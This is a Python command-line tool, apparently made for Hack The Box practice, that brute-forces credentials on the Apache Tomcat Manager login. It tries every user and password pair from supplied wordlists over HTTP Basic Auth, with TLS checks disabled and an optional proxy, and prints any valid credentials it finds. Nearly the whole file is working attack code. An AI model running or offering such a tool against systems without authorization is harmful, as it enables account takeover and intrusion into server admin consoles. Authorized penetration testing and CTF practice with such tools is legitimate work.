import requests
import argparse
import sys
from itertools import product
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich import print as rprint
from requests.auth import HTTPBasicAuth
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

BANNER = """
[bold red]
╔╦╗╔═╗╔╦╗╔═╗╔═╗╔╦╗  ╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╦═╗╔═╗╔═╗
 ║ ║ ║║║║║  ╠═╣ ║   ╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ╠╦╝║  ║╣ 
 ╩ ╚═╝╩ ╩╚═╝╩ ╩ ╩   ╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╩╚═╚═╝╚═╝
[/bold red]
[bold white]        Apache Tomcat User Enumerator[/bold white]
[dim]        by r4vl1t0 | HTB Tool[/dim]
"""

def parse_args():
    parser = argparse.ArgumentParser(
        description="Tomcat Manager Brute Force & User Enumeration",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--url", required=True, help="Target URL (ej: http://10.10.10.10)")
    parser.add_argument("-P", "--path", required=True, help="Path del manager (ej: /manager/html, /host-manager/html)")
    parser.add_argument("-u", "--user", required=True, help="Usuario o wordlist de usuarios")
    parser.add_argument("-p", "--password", required=True, help="Password o wordlist de contraseñas")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Timeout por request (default: 5)")
    parser.add_argument("-x", "--proxy", default=None, help="Proxy (ej: http://127.0.0.1:8080)")
    parser.add_argument("--stop-on-success", action="store_true", default=True, help="Parar al encontrar credencial válida")
    return parser.parse_args()

def load_wordlist(value):
    """Si el valor es un archivo, lo carga como lista. Si no, lo trata como valor único."""
    try:
        with open(value, "r", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except (FileNotFoundError, IsADirectoryError):
        return [value]

def try_login(url, username, password, timeout, proxies):
    """Intenta autenticarse al manager de Tomcat."""
    try:
        response = requests.get(
            url,
            auth=HTTPBasicAuth(username, password),
            timeout=timeout,
            verify=False,
            proxies=proxies,
            allow_redirects=True
        )
        return response.status_code
    except requests.exceptions.ConnectionError:
        return "CONNECTION_ERROR"
    except requests.exceptions.Timeout:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"

def main():
    console.print(BANNER)

    args = parse_args()

    # Construir URL completa
    target = args.url.rstrip("/") + "/" + args.path.lstrip("/")
    console.print(f"[bold cyan][*] Target:[/bold cyan] {target}")

    # Cargar usuarios y passwords
    users = load_wordlist(args.user)
    passwords = load_wordlist(args.password)
    total = len(users) * len(passwords)

    console.print(f"[bold cyan][*] Usuarios:[/bold cyan]  {len(users)}")
    console.print(f"[bold cyan][*] Passwords:[/bold cyan] {len(passwords)}")
    console.print(f"[bold cyan][*] Total combinaciones:[/bold cyan] {total}\n")

    # Proxy
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    found = []

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold blue]Probando:[/bold blue] [yellow]{task.fields[current]}[/yellow]"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("[dim]({task.completed}/{task.total})[/dim]"),
        TimeElapsedColumn(),
        console=console,
        transient=False
    ) as progress:

        task = progress.add_task("brute", total=total, current="...")

        for username, password in product(users, passwords):
            progress.update(task, current=f"{username}:{password}")

            status = try_login(target, username, password, args.timeout, proxies)

            if status == 200:
                rprint(f"\n[bold green][+] CREDENCIALES VÁLIDAS → {username}:{password}[/bold green]")
                found.append((username, password))
                if args.stop_on_success:
                    progress.stop()
                    break

            elif status == 401:
                pass  # credenciales incorrectas, normal

            elif status == 403:
                rprint(f"\n[bold yellow][!] 403 Forbidden — Usuario existe pero sin acceso: {username}:{password}[/bold yellow]")

            elif status == 404:
                rprint(f"\n[bold red][!] 404 — Path incorrecto: {target}[/bold red]")
                sys.exit(1)

            elif status == "CONNECTION_ERROR":
                rprint(f"\n[bold red][!] Error de conexión. ¿El host está activo?[/bold red]")
                sys.exit(1)

            elif status == "TIMEOUT":
                rprint(f"\n[bold yellow][!] Timeout en {username}:{password}[/bold yellow]")

            progress.advance(task)

    # Resumen final
    console.print("\n")
    if found:
        table = Table(title="✅ Credenciales Encontradas", style="bold green")
        table.add_column("Usuario", style="cyan")
        table.add_column("Password", style="magenta")
        for u, p in found:
            table.add_row(u, p)
        console.print(table)
        console.print(f"\n[bold green][+] Accede en:[/bold green] {target}")
    else:
        console.print("[bold red][-] No se encontraron credenciales válidas.[/bold red]")

if __name__ == "__main__":
    main()
